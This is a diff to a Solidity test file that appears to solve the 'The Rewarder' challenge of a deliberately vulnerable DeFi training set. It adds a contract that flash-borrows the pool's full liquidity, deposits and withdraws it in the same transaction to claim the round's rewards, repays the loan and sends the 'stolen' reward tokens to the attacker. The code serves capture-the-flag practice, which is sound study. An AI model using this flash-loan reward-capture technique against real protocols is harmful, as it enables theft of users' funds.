@@ -10,6 +10,40 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+import {Test} from "forge-std/Test.sol";
+
+contract FlashLoanReceiver is Test {
+    TheRewarderPool theRewarderPool;
+    FlashLoanerPool flashLoanerPool;
+
+    constructor(TheRewarderPool _theRewarderPool, FlashLoanerPool _flashLoanerPool) {
+	theRewarderPool = _theRewarderPool;
+	flashLoanerPool = _flashLoanerPool;
+    }
+
+    function pwn(uint256 amount) external {
+	flashLoanerPool.flashLoan(amount);
+
+	uint256 stoleAmt = theRewarderPool.rewardToken().balanceOf(address(this));
+	emit log_named_uint("stole this! ", stoleAmt);
+
+	theRewarderPool.rewardToken().transfer(msg.sender, stoleAmt);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+	IERC20(address(flashLoanerPool.liquidityToken())).approve(address(theRewarderPool), amount);
+
+	theRewarderPool.deposit(amount);
+	theRewarderPool.withdraw(amount);
+
+	assertTrue(IERC20(address(flashLoanerPool.liquidityToken())).transfer(address(flashLoanerPool), amount));
+
+	// emit log_named_uint("transferred", amount);
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -89,7 +123,14 @@ contract TheRewarder is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+	vm.startPrank(attacker);
+	vm.warp(block.timestamp + 5 days);
+	assertTrue(theRewarderPool.isNewRewardsRound());
 
+	FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver(theRewarderPool, flashLoanerPool);
+	flashLoanReceiver.pwn(TOKENS_IN_LENDER_POOL);
+
+	vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
